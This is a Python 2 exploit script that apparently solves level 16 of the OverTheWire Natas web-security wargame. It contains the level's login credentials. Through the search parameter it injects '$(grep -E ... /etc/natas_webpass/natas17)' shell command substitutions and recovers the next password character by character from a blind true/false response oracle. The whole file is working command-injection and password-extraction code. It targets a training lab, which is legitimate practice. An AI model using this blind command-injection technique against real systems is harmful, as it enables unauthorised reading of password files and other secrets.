#!/bin/python

import requests, string

url = "http://natas16.natas.labs.overthewire.org"
user = "natas16"
passw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# $(grep -E ^a.* /etc/natas_webpass/natas16)hello

test_string = "hello"

chars_list = ''.join([string.ascii_letters, string.digits])

valid_chars = []
for c in chars_list:
	query = "$(grep -E " + c + ".* /etc/natas_webpass/natas17)" + test_string
	full_url = url+"?needle="+query+"&submit=Search"
	r = requests.get(full_url, auth=(user,passw))

	if test_string not in r.content:
		valid_chars.append(c)
		print "Valid chars: " + ''.join(valid_chars)

print ""


final_pass = ""
for i in range(32):
	for c in valid_chars:
		query = "$(grep -E ^" + final_pass + c + ".* /etc/natas_webpass/natas17)" + test_string
		full_url = url+"?needle="+query+"&submit=Search"
		r = requests.get(full_url, auth=(user,passw))

		if test_string not in r.content:
			final_pass+=c
			print "Current password: " + final_pass
			break

print ""
print "Final password: " + final_pass